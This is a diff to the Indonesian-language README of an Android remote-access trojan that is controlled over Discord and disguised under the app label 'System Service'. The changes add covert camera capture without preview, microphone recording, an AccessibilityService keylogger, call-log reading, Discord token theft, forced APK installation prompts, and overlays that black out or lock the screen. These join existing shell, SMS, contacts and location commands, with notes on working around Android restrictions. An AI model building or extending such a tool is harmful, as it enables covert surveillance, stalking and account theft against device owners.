@@ -120,6 +120,8 @@ obrolan di channel.
 | perintah | keterangan |
 |---|---|
 | `info` | model, sdk, cwd, baterai, status storage, jumlah permission kurang |
+| `sys` | info lengkap: uptime, layar, RAM, security patch, fingerprint |
+| `ping` | latensi ke API Discord (ms + kode HTTP) |
 | `help` | daftar perintah |
 | `sh <cmd>` | shell, jalan sebagai uid aplikasi (bukan root) |
 | `cd <path>` / `ls [path]` | navigasi folder |
@@ -127,12 +129,30 @@ obrolan di channel.
 | `up <path>` | kirim perintah + lampiran → tersimpan di path |
 | `gh <url> [dest]` | unduh dari URL |
 | `shot` | screencap → attachment, atau lapor error aslinya |
+| `cam [front\|back]` | foto kamera → attachment, tanpa preview |
+| `mic [detik]` | rekam mikrofon → WAV, maks 120 detik |
 | `clip [teks]` | baca / tulis clipboard |
 | `ps` / `kill <pid\|package>` | proses |
-| `msg <teks>` | toast di layar |
+| `msg` / `toast <teks>` | toast di layar |
+| `notify <judul>\|<isi>` | notifikasi di shade |
+| `tts <teks>` | suara TextToSpeech di HP |
+| `vol [0-100\|up\|down\|mute\|unmute]` | volume media |
+| `vib [ms]` | getar, 80–8000 ms |
+| `torch on\|off` | flash kamera |
 | `loc` | lokasi terakhir (GPS atau network) |
 | `sms <nomor>\|<teks>` / `smsread` | SMS |
-| `contacts` / `apps` | kontak / daftar aplikasi |
+| `contacts` / `apps` / `calls` | kontak / aplikasi / log panggilan |
+| `keylog on\|off\|dump\|clear` | keylogger lewat AccessibilityService |
+| `black on\|off` | layar jadi hitam penuh |
+| `block on\|off` | semua sentuhan diserap overlay |
+| `rick [url]` | layar penuh video, tombol back dimatikan |
+| `close` | tutup overlay dan player |
+| `open <url>` | buka URL di browser bawaan |
+| `inst <url\|path>` | unduh + dialog pasang APK |
+| `wifi` | SSID, IP, sinyal; profil tersimpan butuh root |
+| `root` | cek `su`, uid, SELinux |
+| `reboot [now\|shutdown\|recovery\|bootloader]` | butuh root |
+| `grab` | cari token Discord di data aplikasi, butuh root |
 | `ip [pub]` | IP lokal (atau publik dengan `pub`) |
 | `storage` / `battery` | kapasitas / baterai + status optimasi |
 | `perm` | permission mana yang belum diberikan |
@@ -190,6 +210,38 @@ membunuh service. Tidak ada obat tanpa autostart permission vendor.
 balasan PC (`[a] ...`) dan HP (`[b] ...`) masuk ke channel yang sama. Kalau
 mau benar-benar terpisah, buat bot kedua.
 
+**`black` dan `block` butuh izin overlay.** `SYSTEM_ALERT_WINDOW` tidak punya
+dialog runtime; pemilik perangkat harus mengizinkannya di Settings. `MainActivity`
+membuka layar itu sekali saat aplikasi pertama dijalankan. Tanpa izin, perintah
+balas `ERR izin 'tampil di atas aplikasi lain' belum ada` — bukan diam.
+
+**`keylog` butuh persetujuan pemilik perangkat.** AccessibilityService hanya
+boleh diaktifkan manual di Settings > Accessibility; tidak ada API untuk
+menyalakannya dari aplikasi, dan itu bukan sesuatu yang bisa dilewati tanpa
+root. Setelah aktif, yang tercatat hanya kolom teks yang memang diekspos
+aplikasi — kolom password ditandai `password` oleh aplikasi dan isinya tidak
+dikirim OS. Event-nya berisi isi kolom penuh, jadi yang disimpan adalah selisih
+terhadap isi terakhir per aplikasi.
+
+**`cam` tanpa preview.** Camera2 di sini capture langsung ke `ImageReader.JPEG`
+tanpa preview, dan ukuran diambil dari `StreamConfigurationMap` perangkat. Di
+beberapa chipset capture tanpa preview ditolak HAL; kalau itu terjadi balasannya
+`CAM_GAGAL` dengan kode errornya, bukan file kosong.
+
+**`mic` di background.** Di Android 11+ mikrofon dari service background bisa
+diblokir kalau aplikasi tidak punya foreground service bertipe `microphone`.
+Rekaman yang gagal balas `MIC_GAGAL tidak ada data` — sengaja dibedakan dari
+"izin belum ada", karena penyebabnya beda.
+
+**`inst` selalu lewat dialog.** Memasang APK dari aplikasi butuh izin "install
+unknown apps" per-aplikasi dan konfirmasi pemasangan di layar. Tanpa root itu
+tidak bisa dilewati; yang bisa dilakukan cuma menyiapkan file dan membuka
+dialognya.
+
+**Fitur root.** `wifi` (profil tersimpan), `reboot`, `grab`, dan `su`-based
+lainnya balas jelas kalau `su` tidak ada. Tidak ada eksploit lokal di sini —
+kalau perangkat tidak di-root, itu memang jawabannya.
+
 ## Yang sudah dan belum dites
 
 Sudah terpasang dan dijalankan di perangkat nyata: **SM-X910N, Android 9, SDK 28**
@@ -220,20 +272,30 @@ apksigner verify --print-certs
   Verified using v2 scheme (APK Signature Scheme v2): true
 
 aapt2 dump badging
-  package com.kai.mobilerat v1.1  minSdk 24  targetSdk 29
+  package com.kai.mobilerat v1.2  minSdk 24  targetSdk 29
   label 'System Service'  foregroundServiceType=0x1 (dataSync)
 
 classes.dex
   C2Service / BootReceiver / MainActivity utuh (tidak ter-obfuscate)
+  KeylogService / PlayerActivity / Actions / Overlay ikut terpaket
   token plaintext: tidak ada
 ```
 
 Belum terbukti: service hidup setelah reboot, upload attachment di jaringan
 seluler, dan `screencap` (di Android 9 `screencap` sebagai uid aplikasi tetap
-gagal karena butuh `READ_FRAME_BUFFER`; itu batas OS, bukan bug kode).
+gagal karena butuh `READ_FRAME_BUFFER`; itu batas OS, bukan bug kode). Perintah
+v1.2 (`cam`, `mic`, `keylog`, `black`, `block`, `rick`, `vol`, `tts`, `wifi`,
+`root`, `reboot`, `inst`, `open`, `grab`, `calls`, `sys`, `ping`) baru
+diverifikasi sampai build + isi dex; belum dijalankan di perangkat.
 
 ## Riwayat
 
+- **v1.2** — 16 perintah baru mengikuti daftar fitur RAT Discord pada umumnya,
+  diadaptasi ke batas Android: `sys ping vol tts notify toast vib torch cam mic
+  keylog black block rick close open inst wifi root reboot grab calls`.
+  File baru: `Actions.kt`, `Overlay.kt`, `KeylogService.kt`, `PlayerActivity.kt`,
+  `res/xml/accessibility_service_config.xml`, `res/xml/paths.xml`.
+  `Perms` sekarang juga meminta CAMERA, RECORD_AUDIO, READ_CALL_LOG.
 - `legacy/` berisi `C2Service.kt`, `Config.kt`, `MainActivity.kt`,
   `BootReceiver.kt`, `AndroidManifest.xml`, `build.gradle` versi Kilo —
   disimpan tanpa diubah untuk pembanding.
